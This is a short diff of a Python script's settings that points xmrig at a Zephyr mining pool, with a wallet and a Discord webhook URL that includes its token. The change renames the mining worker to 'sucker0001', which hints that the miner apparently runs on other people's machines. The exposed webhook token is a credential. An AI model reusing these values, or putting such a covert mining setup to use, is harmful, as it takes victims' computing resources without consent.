@@ -5,7 +5,7 @@ import requests
 
 # Configuration (Webhook and Pool Information)
 WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # Replace with actual webhook
-WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker"  # Replace with your Monero wallet
+WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.sucker0001"  # Replace with your Monero wallet
 POOL = "fr.zephyr.herominers.com:1123"  # Replace with your mining pool
 
 # Paths for xmrig
